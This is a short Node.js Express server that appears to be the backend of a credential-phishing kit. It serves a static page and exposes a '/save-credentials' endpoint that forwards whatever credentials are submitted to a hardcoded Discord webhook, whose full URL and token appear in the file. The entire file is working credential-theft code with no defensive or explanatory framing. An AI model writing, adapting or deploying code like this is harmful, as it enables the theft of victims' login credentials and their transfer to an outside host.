const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.text({ type: 'text/plain' }));

app.use(express.static(path.join(__dirname, 'public')));

const discordWebhookUrl = 'https://discord.com/api/webhooks/1256297119669555352/mMgiWnisGaoKg5mJRa5P_y6kRUb9MdYmXQM8B1iz21s2VqqBcZrVgs9vWHVReECzrIUB';

app.post('/save-credentials', async (req, res) => {
    const credentials = req.body;
    const payload = { content: `New credentials submitted:\n${credentials}` };

    try {
        const response = await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        if (response.ok) {
            console.log('Credentials sent to Discord:', credentials);
            res.status(200).send('Credentials sent successfully.');
        } else {
            console.error('Error sending credentials to Discord:', response.statusText);
            res.status(500).send('Error sending credentials.');
        }
    } catch (error) {
        console.error('Error sending credentials to Discord:', error);
        res.status(500).send('Error sending credentials.');
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
}); 
